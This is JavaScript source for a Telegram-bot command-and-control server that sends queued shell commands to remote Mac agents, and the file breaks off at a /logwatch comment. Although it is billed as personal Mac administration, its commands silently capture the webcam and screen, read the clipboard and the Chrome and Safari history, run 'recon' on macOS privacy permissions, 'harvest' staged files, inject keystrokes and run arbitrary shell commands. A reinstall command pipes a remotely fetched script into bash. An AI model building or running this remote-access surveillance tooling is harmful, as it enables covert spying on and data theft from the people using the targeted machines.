require('dotenv').config();
const { Telegraf } = require('telegraf');
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { v4: uuidv4 } = require('uuid');

// ─── Config ───────────────────────────────────────────────────────────────────
const {
  TELEGRAM_TOKEN,    // From @BotFather
  ALLOWED_CHAT_ID,   // Your personal Telegram chat ID
  AGENT_SECRET,      // Shared secret with all Mac agents
  ADMIN_TOKEN,       // Shared secret with Vercel config server
  CONFIG_SERVER_URL, // e.g. https://mymac-config.vercel.app
  PORT = 3000,
} = process.env;

['TELEGRAM_TOKEN', 'ALLOWED_CHAT_ID', 'AGENT_SECRET', 'ADMIN_TOKEN', 'CONFIG_SERVER_URL']
  .forEach((name) => {
    if (!process.env[name]) { console.error(`Missing env var: ${name}`); process.exit(1); }
  });

// ─── State ────────────────────────────────────────────────────────────────────
// Per-device command queues:  deviceId → [{ id, cmd, chatId, requestedAt }]
const deviceQueues = {};
// Result store:  id → { output, exitCode, finishedAt }
const resultStore  = {};
// Known devices cache (refreshed from Vercel every 30 s or on demand)
let devicesCache   = [];
let devicesCacheAt = 0;

// ─── Helpers ──────────────────────────────────────────────────────────────────
function isAuthorized(ctx) {
  return String(ctx.chat.id) === String(ALLOWED_CHAT_ID);
}

function reply(chatId, text, extra = {}) {
  return bot.telegram.sendMessage(chatId, text, { parse_mode: 'Markdown', ...extra });
}

// ─── Vercel config-server helpers ─────────────────────────────────────────────
async function configReq(method, path, body) {
  const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
  const res = await (await fetch)(`${CONFIG_SERVER_URL}${path}`, {
    method,
    headers: { 'x-admin-token': ADMIN_TOKEN, 'Content-Type': 'application/json' },
    ...(body ? { body: JSON.stringify(body) } : {}),
  });
  return res.json();
}

async function getDevices(force = false) {
  if (!force && Date.now() - devicesCacheAt < 30_000 && devicesCache.length > 0) {
    return devicesCache;
  }
  const data = await configReq('GET', '/api/devices');
  devicesCache = data.devices ?? [];
  devicesCacheAt = Date.now();
  return devicesCache;
}

async function resolveDevice(query) {
  const devices = await getDevices(true);
  const q = query.toLowerCase();
  return devices.find(
    (d) => d.deviceId.toLowerCase().startsWith(q) || d.hostname.toLowerCase().startsWith(q)
  );
}

function onlineStatus(device) {
  const age = Date.now() - new Date(device.lastSeen).getTime();
  return age < 90_000 ? '🟢' : age < 300_000 ? '🟡' : '🔴';
}

// ─── Telegram Bot (Telegraf) ──────────────────────────────────────────────────
const bot = new Telegraf(TELEGRAM_TOKEN);

// /start
bot.command('start', (ctx) => {
  if (!isAuthorized(ctx)) return;
  reply(ctx.chat.id,
    `*mymac admin*\n\nControl all your Macs remotely.\n\n` +
    `• \`/devices\` – list all Macs\n` +
    `• \`/run <cmd>\` – broadcast to all Macs\n` +
    `• \`/run @<hostname> <cmd>\` – specific Mac\n` +
    `• \`/screenshot\` \`/webcam\` \`/clip\` – recon\n` +
    `• \`/config\` – view server config\n` +
    `• \`/help\` – full command list`
  );
});

// /help
bot.command('help', (ctx) => {
  if (!isAuthorized(ctx)) return;
  reply(ctx.chat.id,
    `*Commands*\n\n` +
    `*Run raw shell:*\n` +
    `\`/run <cmd>\` – broadcast to all Macs\n` +
    `\`/run @<hostname> <cmd>\` – target one Mac\n\n` +
    `*System info:*\n` +
    `\`/sysinfo\` – hardware & OS overview\n` +
    `\`/uptime\` – uptime & macOS version\n` +
    `\`/procs\` – top CPU processes\n` +
    `\`/disk\` – disk usage\n` +
    `\`/battery\` – battery status\n` +
    `\`/frontapp\` – currently focused app\n` +
    `\`/idle\` – seconds since last user input\n` +
    `\`/env\` – environment variables\n` +
    `\`/crontabs\` – scheduled cron jobs\n\n` +
    `*Screen & camera:*\n` +
    `\`/screenshot\` – silent screenshot (all Macs)\n` +
    `\`/screenshotwindow [@host] <name>\` – screenshot a specific window\n` +
    `\`/activewindow\` – frontmost window title + owner\n` +
    `\`/record [@host] [seconds]\` – screen record (default 10 s)\n` +
    `\`/webcam\` – silent webcam frame (all Macs)\n` +
    `\`/windows\` – list open windows\n` +
    `\`/lock\` – lock screen\n` +
    `\`/sleep\` – sleep\n` +
    `\`/darkmode\` – toggle dark mode\n\n` +
    `*Clipboard:*\n` +
    `\`/clip\` – get clipboard contents\n\n` +
    `*Audio:*\n` +
    `\`/volume\` – get output volume\n` +
    `\`/mute\` – mute output\n` +
    `\`/unmute\` – unmute output\n\n` +
    `*Network:*\n` +
    `\`/netstat\` – established connections\n` +
    `\`/listening\` – listening ports\n` +
    `\`/wifi\` – current Wi-Fi info\n` +
    `\`/wifiscan\` – nearby networks\n` +
    `\`/publicip\` – public IP address\n` +
    `\`/arp\` – ARP table\n` +
    `\`/routes\` – routing table\n` +
    `\`/dns\` – DNS servers\n\n` +
    `*Files:*\n` +
    `\`/downloads\` – list ~/Downloads\n` +
    `\`/recentfiles\` – recently modified files\n\n` +
    `*Browser history:*\n` +
    `\`/chromehistory\` – last 20 Chrome URLs\n` +
    `\`/safarihistory\` – last 20 Safari URLs\n\n` +
    `*Security:*\n` +
    `\`/launchagents\` – persistence entries\n` +
    `\`/firewall\` – firewall status\n` +
    `\`/gatekeeper\` – Gatekeeper status\n` +
    `\`/sip\` – SIP status\n` +
    `\`/tcc\` – TCC database recon (privacy permissions)\n` +
    `\`/tcctest\` – TCC live access test\n` +
    `\`/tcccheck [@host] <service>\` – check one TCC service\n` +
    `\`/tccdbpaths\` – show TCC database paths\n\n` +
    `*Power:*\n` +
    `\`/restart\` – restart\n` +
    `\`/shutdown\` – shutdown\n\n` +
    `*Sleep / wake:*\n` +
    `\`/powersettings\` – show all pmset settings\n` +
    `\`/lastwake\` – recent wake/sleep events\n` +
    `\`/wakeschedule\` – list scheduled wakes\n` +
    `\`/cancelwake\` – cancel all scheduled wakes\n` +
    `\`/enablepowernap\` – wake for network during sleep\n` +
    `\`/enablewol\` – enable Wake on LAN\n` +
    `\`/setwake [@host] MM/DD/YY HH:MM:SS\` – schedule one-time wake\n` +
    `\`/stayawake [@host] <seconds>\` – prevent sleep for N seconds\n\n` +
    `*Devices:*\n` +
    `\`/devices\` – list all Macs with status\n` +
    `\`/forget @<hostname>\` – remove a device\n\n` +
    `*Config (bot server):*\n` +
    `\`/config\` – show current config\n` +
    `\`/setserver <url>\` – update bot server URL\n` +
    `\`/setsecret <secret>\` – update agent secret\n\n` +
    `*Releases (agent self-update):*\n` +
    `\`/release\` – show published release\n` +
    `\`/setrelease <ver> <arm64-url> [amd64-url] [arm64-sha256] [amd64-sha256]\`\n` +
    `\`/update [@hostname]\` – force immediate update check\n` +
    `\`/reinstall [@hostname] <gh-token>\` – full fresh reinstall of daemon\n\n` +
    `*Processes (mackit):*\n` +
    `\`/pid [@host] <name>\` – get PID for a process name\n` +
    `\`/entitlements [@host] <pid|path>\` – dump entitlements\n` +
    `\`/kill [@host] <pid>\` – kill a process by PID\n` +
    `\`/isrunning [@host] <name>\` – check if process is running\n\n` +
    `*Accessibility (mackit):*\n` +
    `\`/axenabled\` – check if Accessibility is enabled\n` +
    `\`/axattr [@host] <app> <attr>\` – get AX attribute\n` +
    `\`/axchildren [@host] <app>\` – list AX children\n` +
    `\`/axdescribe [@host] <path>\` – describe AX element\n` +
    `\`/axfocus [@host] <app> <path>\` – focus AX element\n\n` +
    `*Scripting (mackit):*\n` +
    `\`/notify [@host] <title> | <msg>\` – send macOS notification\n` +
    `\`/dialog [@host] <message>\` – show dialog on Mac\n` +
    `\`/keystroke [@host] <key> [mods]\` – send keystroke\n` +
    `\`/keycode [@host] <code> [mods]\` – send key code\n` +
    `\`/logwatch [@host] <proc> <secs>\` – watch process logs\n` +
    `\`/script [@host] <applescript>\` – run AppleScript inline\n\n` +
    `*Filesystem (mackit):*\n` +
    `\`/fsstage\` – stage files for harvest\n` +
    `\`/fsharvest\` – harvest staged files\n` +
    `\`/fsclean\` – clean staged files\n\n` +
    `*Queue:*\n` +
    `\`/status\` – pending command counts\n` +
    `\`/clear\` – clear all queues`
  );
});

// /devices
bot.command('devices', async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const chatId = ctx.chat.id;
  try {
    const devices = await getDevices(true);
    if (!devices.length) return reply(chatId, 'No devices registered yet.');
    const lines = devices.map((d) => {
      const q = (deviceQueues[d.deviceId] ?? []).length;
      const last = new Date(d.lastSeen).toLocaleString();
      return (
        `${onlineStatus(d)} *${d.hostname}* (${d.arch})\n` +
        `  ID: \`${d.deviceId.slice(0, 8)}\`  Queue: ${q}  Last seen: ${last}`
      );
    });
    reply(chatId, `*Registered Macs (${devices.length}):*\n\n${lines.join('\n\n')}`);
  } catch (e) {
    reply(chatId, `Error: ${e.message}`);
  }
});

// /forget @hostname
bot.hears(/^\/forget @?(\S+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const match = ctx.match;
  const device = await resolveDevice(match[1].trim());
  if (!device) return reply(ctx.chat.id, `Device \`${match[1]}\` not found.`);
  await configReq('POST', '/api/devices/remove', { deviceId: device.deviceId });
  delete deviceQueues[device.deviceId];
  await getDevices(true);
  reply(ctx.chat.id, `✅ Removed: *${device.hostname}*`);
});

// /config
bot.command('config', async (ctx) => {
  if (!isAuthorized(ctx)) return;
  try {
    const cfg = await configReq('GET', '/api/config');
    reply(ctx.chat.id,
      `*Server config* (v${cfg.version ?? '?'})\n` +
      `URL: \`${cfg.serverUrl || '(not set)'}\`\n` +
      `Secret: \`${cfg.agentSecret ? cfg.agentSecret.slice(0, 8) + '…' : '(not set)'}\`\n` +
      `Updated: ${cfg.updatedAt ?? 'never'}\n\n` +
      `Use /setserver and /setsecret to change.`
    );
  } catch (e) {
    reply(ctx.chat.id, `Error: ${e.message}`);
  }
});

// /setserver <url>
bot.hears(/^\/setserver (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const url = ctx.match[1].trim().replace(/\/$/, '');
  try {
    await configReq('POST', '/api/config', { serverUrl: url });
    reply(ctx.chat.id,
      `✅ Server URL updated:\n\`${url}\`\n\n` +
      `All agents will reconnect within ~5 min on their next config poll.`
    );
  } catch (e) {
    reply(ctx.chat.id, `Error: ${e.message}`);
  }
});

// /setrelease <version> <arm64-url> [amd64-url] [arm64-sha256] [amd64-sha256]
bot.hears(/^\/setrelease (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const parts = ctx.match[1].trim().split(/\s+/);
  const [version, arm64Url, amd64Url, arm64Sha256, amd64Sha256] = parts;
  if (!version || !arm64Url) {
    return reply(ctx.chat.id,
      'Usage: `/setrelease <version> <arm64-url> [amd64-url] [arm64-sha256] [amd64-sha256]`'
    );
  }
  try {
    await configReq('POST', '/api/release', {
      version,
      arm64Url,
      ...(amd64Url    ? { amd64Url }    : {}),
      ...(arm64Sha256 ? { arm64Sha256 } : {}),
      ...(amd64Sha256 ? { amd64Sha256 } : {}),
    });
    const shaNote = arm64Sha256 ? `\narm64 sha256: \`${arm64Sha256.slice(0, 12)}…\`` : ' _(no checksum — less secure)_';
    reply(ctx.chat.id,
      `✅ Release published: \`${version}\`\n` +
      `arm64: \`${arm64Url}\`${shaNote}\n\n` +
      `Agents will update within ~1 hour, or immediately via /update.`
    );
  } catch (e) {
    reply(ctx.chat.id, `Error: ${e.message}`);
  }
});

// /update [@hostname] – force immediate update check on one or all agents
bot.hears(/^\/update(?: @?([\w.-]+))?$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const chatId = ctx.chat.id;
  const cmd = '__update__';
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
    reply(chatId, `🔄 Update check triggered on *${device.hostname}*.`);
  } else {
    const devices = await getDevices();
    if (!devices.length) return reply(chatId, 'No devices registered yet.');
    for (const d of devices) enqueue(chatId, d.deviceId, d.hostname, cmd);
    reply(chatId, `🔄 Update check triggered on *${devices.length}* Mac(s).`);
  }
});

// /release – show current published release
bot.command('release', async (ctx) => {
  if (!isAuthorized(ctx)) return;
  try {
    const rel = await configReq('GET', '/api/release');
    if (!rel.version) return reply(ctx.chat.id, 'No release published yet. Use /setrelease.');
    reply(ctx.chat.id,
      `*Current release:* \`${rel.version}\`\n` +
      `arm64: \`${rel.arm64Url || '(not set)'}\`\n` +
      `amd64: \`${rel.amd64Url || '(not set)'}\`\n` +
      `Published: ${rel.publishedAt ?? 'unknown'}`
    );
  } catch (e) {
    reply(ctx.chat.id, `Error: ${e.message}`);
  }
});

// /setsecret <secret>
bot.hears(/^\/setsecret (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const secret = ctx.match[1].trim();
  try {
    await configReq('POST', '/api/config', { agentSecret: secret });
    process.env.AGENT_SECRET = secret; // update in-memory immediately
    reply(ctx.chat.id,
      `✅ Agent secret updated in Firebase and applied immediately.\n\n` +
      `Agents will pick up the new secret within ~5 min on their next config poll.`
    );
  } catch (e) {
    reply(ctx.chat.id, `Error: ${e.message}`);
  }
});

// /status
bot.command('status', async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const devices = await getDevices();
  const lines = devices.map(
    (d) => `${onlineStatus(d)} *${d.hostname}*: ${(deviceQueues[d.deviceId] ?? []).length} pending`
  );
  reply(ctx.chat.id,
    `*Queue status*\n${lines.join('\n') || 'No devices'}\n\nResults buffered: ${Object.keys(resultStore).length}`
  );
});

// /clear
bot.command('clear', (ctx) => {
  if (!isAuthorized(ctx)) return;
  Object.keys(deviceQueues).forEach((k) => { deviceQueues[k] = []; });
  reply(ctx.chat.id, '✅ All queues cleared.');
});

// ── Built-in shortcut commands (broadcast to all) ─────────────────────────────
const SHORTCUTS = {
  // System info
  '/sysinfo':       { cmd: 'system_profiler SPHardwareDataType SPSoftwareDataType 2>/dev/null' },
  '/uptime':        { cmd: 'uptime && sw_vers' },
  '/procs':         { cmd: '__mackit__:procs' },
  '/disk':          { cmd: 'df -h' },
  '/battery':       { cmd: 'pmset -g batt' },
  '/frontapp':      { cmd: `osascript -e 'tell application "System Events" to get name of first application process whose frontmost is true'` },
  '/idle':          { cmd: `ioreg -c IOHIDSystem | awk '/HIDIdleTime/ {print int($NF/1000000000)" seconds idle"; exit}'` },
  '/env':           { cmd: 'printenv | sort' },
  '/crontabs':      { cmd: 'crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null' },

  // Screen & camera
  '/screenshot':    { cmd: '__mackit__:screenshot', type: 'screenshot' },
  '/webcam':        { cmd: 'ffmpeg -f avfoundation -video_size 1280x720 -framerate 30 -i "0" -frames:v 1 -y /tmp/_wc.jpg 2>/dev/null && base64 /tmp/_wc.jpg && rm -f /tmp/_wc.jpg', type: 'screenshot' },
  '/windows':       { cmd: '__mackit__:windows' },
  '/activewindow':  { cmd: '__mackit__:activewindow' },
  '/lock':          { cmd: `osascript -e 'tell application "System Events" to keystroke "q" using {command down, control down}'` },
  '/sleep':         { cmd: 'pmset sleepnow' },
  '/darkmode':      { cmd: `osascript -e 'tell app "System Events" to tell appearance preferences to set dark mode to not dark mode'` },

  // Clipboard
  '/clip':          { cmd: 'pbpaste' },

  // Audio
  '/volume':        { cmd: `osascript -e 'output volume of (get volume settings)'` },
  '/mute':          { cmd: `osascript -e 'set volume with output muted'` },
  '/unmute':        { cmd: `osascript -e 'set volume without output muted'` },

  // Network
  '/netstat':       { cmd: 'lsof -i -n -P | grep ESTABLISHED' },
  '/listening':     { cmd: 'lsof -iTCP -sTCP:LISTEN -n -P' },
  '/wifi':          { cmd: '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I' },
  '/wifiscan':      { cmd: '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s' },
  '/publicip':      { cmd: 'curl -s https://api.ipify.org' },
  '/arp':           { cmd: 'arp -a' },
  '/routes':        { cmd: 'netstat -rn' },
  '/dns':           { cmd: 'scutil --dns | grep nameserver | sort -u' },

  // Files
  '/downloads':     { cmd: 'ls -lah ~/Downloads/ | head -40' },
  '/recentfiles':   { cmd: `find ~ -not -path '*/.*' -maxdepth 5 -type f -newer /tmp 2>/dev/null | head -25` },

  // Browser history
  '/chromehistory': { cmd: `sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/History 'SELECT datetime(last_visit_time/1000000-11644473600,"unixepoch","localtime"),title,url FROM urls ORDER BY last_visit_time DESC LIMIT 20;' 2>/dev/null` },
  '/safarihistory': { cmd: `sqlite3 ~/Library/Safari/History.db 'SELECT datetime(visit_time+978307200,"unixepoch","localtime"),title,url FROM history_items JOIN history_visits ON history_items.id=history_visits.history_item ORDER BY visit_time DESC LIMIT 20;' 2>/dev/null` },

  // Security / persistence
  '/launchagents':  { cmd: 'ls -la ~/Library/LaunchAgents/ 2>/dev/null; ls -la /Library/LaunchAgents/ 2>/dev/null; ls -la /Library/LaunchDaemons/ 2>/dev/null' },
  '/firewall':      { cmd: '/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate' },
  '/gatekeeper':    { cmd: 'spctl --status' },
  '/sip':           { cmd: 'csrutil status' },
  '/tcc':           { cmd: '__mackit__:tcc-recon' },
  '/tcctest':       { cmd: '__mackit__:tcc-livetest' },
  '/tccdbpaths':    { cmd: '__mackit__:tcc-dbpaths' },

  // Power
  '/restart':       { cmd: 'shutdown -r now' },
  '/shutdown':      { cmd: 'shutdown -h now' },

  // Sleep / wake persistence
  '/powersettings': { cmd: 'pmset -g' },
  '/lastwake':      { cmd: 'pmset -g log | grep -E "Wake|Sleep" | tail -20' },
  '/wakeschedule':  { cmd: 'pmset -g sched' },
  '/cancelwake':    { cmd: 'pmset schedule cancelall' },
  '/enablepowernap':{ cmd: 'pmset -a powernap 1' },
  '/enablewol':     { cmd: 'pmset -a womp 1' },

  // Accessibility (mackit)
  '/axenabled':     { cmd: '__mackit__:ax-enabled' },

  // Filesystem (mackit)
  '/fsstage':       { cmd: '__mackit__:fs-stage' },
  '/fsharvest':     { cmd: '__mackit__:fs-harvest' },
  '/fsclean':       { cmd: '__mackit__:fs-clean' },
};

Object.entries(SHORTCUTS).forEach(([trigger, { cmd, type }]) => {
  bot.hears(new RegExp(`^\\${trigger}$`), async (ctx) => {
    if (!isAuthorized(ctx)) return;
    await broadcast(ctx.chat.id, cmd, trigger, type);
  });
});

// /reinstall [@hostname] <gh-token>  – fresh reinstall of the agent daemon
bot.hears(/^\/reinstall(?: @?([\w.-]+))? (\S+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target  = ctx.match[1];
  const ghToken = ctx.match[2].trim();
  const chatId  = ctx.chat.id;
  // Downloads install.sh from the private repo using the token, then runs it
  // non-interactively (GH_TOKEN in env skips the interactive prompt).
  const cmd = [
    `curl -fsSL`,
    `-H "Authorization: token ${ghToken}"`,
    `https://raw.githubusercontent.com/chocolaid/mymac/main/install.sh`,
    `| GH_TOKEN=${ghToken} bash`,
  ].join(' ');
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    reply(chatId, `🔄 Reinstalling agent on *${device.hostname}*…`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    const devices = await getDevices();
    if (!devices.length) return reply(chatId, 'No devices registered yet.');
    reply(chatId, `🔄 Reinstalling agent on *${devices.length}* Mac(s)…`);
    for (const d of devices) enqueue(chatId, d.deviceId, d.hostname, cmd);
  }
});

// /setwake [@hostname] MM/DD/YY HH:MM:SS  – schedule a one-time wake
bot.hears(/^\/setwake(?: @?([\w.-]+))? (\d{2}\/\d{2}\/\d{2} \d{2}:\d{2}:\d{2})$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target   = ctx.match[1];
  const dateStr  = ctx.match[2].trim();
  const cmd      = `pmset schedule wakeorpoweron "${dateStr}"`;
  const chatId   = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/setwake ${dateStr}`);
  }
});

// /stayawake [@hostname] <seconds>  – caffeinate for N seconds
bot.hears(/^\/stayawake(?: @?([\w.-]+))?(?: (\d+))?$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const secs   = parseInt(ctx.match[2] ?? '3600');
  const cmd    = `caffeinate -t ${secs} &`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/stayawake ${secs}s`);
  }
});

// /run [@hostname] <cmd>
bot.hears(/^\/run(?: @([\w.-]+))? ([\s\S]+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const cmd    = ctx.match[2].trim();
  const chatId = ctx.chat.id;

  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, cmd);
  }
});

// ── Parameterized mackit commands ─────────────────────────────────────────────

// /screenshotwindow [@host] <name>  – screenshot a named window
bot.hears(/^\/screenshotwindow(?: @?([\w.-]+))? (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const name   = ctx.match[2].trim();
  const cmd    = `__mackit__:screenshot-window ${name}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd, 'screenshot');
  } else {
    await broadcast(chatId, cmd, `/screenshotwindow ${name}`, 'screenshot');
  }
});

// /record [@host] [seconds]  – screen record
bot.hears(/^\/record(?: @?([\w.-]+))?(?: (\d+))?$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const secs   = ctx.match[2] ?? '10';
  const cmd    = `__mackit__:record ${secs}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/record ${secs}s`);
  }
});

// /pid [@host] <name>  – get PID for process name
bot.hears(/^\/pid(?: @?([\w.-]+))? (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const name   = ctx.match[2].trim();
  const cmd    = `__mackit__:pid ${name}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/pid ${name}`);
  }
});

// /entitlements [@host] <pid|path>  – dump entitlements
bot.hears(/^\/entitlements(?: @?([\w.-]+))? (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const arg    = ctx.match[2].trim();
  const cmd    = `__mackit__:entitlements ${arg}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/entitlements ${arg}`);
  }
});

// /kill [@host] <pid>  – kill process by PID
bot.hears(/^\/kill(?: @?([\w.-]+))? (\d+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const pid    = ctx.match[2];
  const cmd    = `__mackit__:kill ${pid}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/kill ${pid}`);
  }
});

// /isrunning [@host] <name>  – check if process is running
bot.hears(/^\/isrunning(?: @?([\w.-]+))? (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const name   = ctx.match[2].trim();
  const cmd    = `__mackit__:isrunning ${name}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/isrunning ${name}`);
  }
});

// /tcccheck [@host] <service>  – check one TCC service
bot.hears(/^\/tcccheck(?: @?([\w.-]+))? (\S+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target  = ctx.match[1];
  const service = ctx.match[2].trim();
  const cmd     = `__mackit__:tcc-check ${service}`;
  const chatId  = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/tcccheck ${service}`);
  }
});

// /axattr [@host] <app> <attr>  – get AX attribute
bot.hears(/^\/axattr(?: @?([\w.-]+))? (\S+) (\S+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const app    = ctx.match[2].trim();
  const attr   = ctx.match[3].trim();
  const cmd    = `__mackit__:ax-attr ${app} ${attr}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/axattr ${app} ${attr}`);
  }
});

// /axchildren [@host] <app>  – list AX children
bot.hears(/^\/axchildren(?: @?([\w.-]+))? (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const app    = ctx.match[2].trim();
  const cmd    = `__mackit__:ax-children ${app}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/axchildren ${app}`);
  }
});

// /axdescribe [@host] <path>  – describe AX element at path
bot.hears(/^\/axdescribe(?: @?([\w.-]+))? (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const path   = ctx.match[2].trim();
  const cmd    = `__mackit__:ax-describe ${path}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/axdescribe ${path}`);
  }
});

// /axfocus [@host] <app> <path>  – focus AX element
bot.hears(/^\/axfocus(?: @?([\w.-]+))? (\S+) (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const app    = ctx.match[2].trim();
  const path   = ctx.match[3].trim();
  const cmd    = `__mackit__:ax-focus ${app} ${path}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/axfocus ${app} ${path}`);
  }
});

// /notify [@host] <title> | <msg>  – send macOS notification
bot.hears(/^\/notify(?: @?([\w.-]+))? (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const args   = ctx.match[2].trim();
  const cmd    = `__mackit__:notify ${args}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/notify ${args}`);
  }
});

// /dialog [@host] <message>  – show dialog on Mac
bot.hears(/^\/dialog(?: @?([\w.-]+))? (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const msg    = ctx.match[2].trim();
  const cmd    = `__mackit__:dialog ${msg}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/dialog ${msg}`);
  }
});

// /keystroke [@host] <key> [mods]  – send keystroke
bot.hears(/^\/keystroke(?: @?([\w.-]+))? (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const args   = ctx.match[2].trim();
  const cmd    = `__mackit__:keystroke ${args}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/keystroke ${args}`);
  }
});

// /keycode [@host] <code> [mods]  – send key code
bot.hears(/^\/keycode(?: @?([\w.-]+))? (.+)$/, async (ctx) => {
  if (!isAuthorized(ctx)) return;
  const target = ctx.match[1];
  const args   = ctx.match[2].trim();
  const cmd    = `__mackit__:keycode ${args}`;
  const chatId = ctx.chat.id;
  if (target) {
    const device = await resolveDevice(target);
    if (!device) return reply(chatId, `Device \`${target}\` not found. See /devices.`);
    enqueue(chatId, device.deviceId, device.hostname, cmd);
  } else {
    await broadcast(chatId, cmd, `/keycode ${args}`);
  }
});

// /logwatch [@host] <process> <seconds>  – watch process logs
